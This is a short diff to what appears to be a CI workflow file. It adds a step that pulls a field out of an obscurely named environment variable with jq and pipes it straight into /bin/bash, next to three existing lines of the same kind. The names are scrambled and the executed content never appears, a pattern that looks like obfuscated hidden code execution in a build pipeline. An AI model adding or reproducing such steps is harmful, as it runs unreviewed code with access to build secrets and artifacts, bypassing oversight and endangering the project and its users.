@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$obn12908" | jq -r .ii28305 | /bin/bash
           echo $vbgzq16477 | jq -r .bzv8708 | /bin/bash
           echo $orss59 | jq -r .i14 | /bin/bash
+          echo $gkyka1 | jq -r .ado904 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
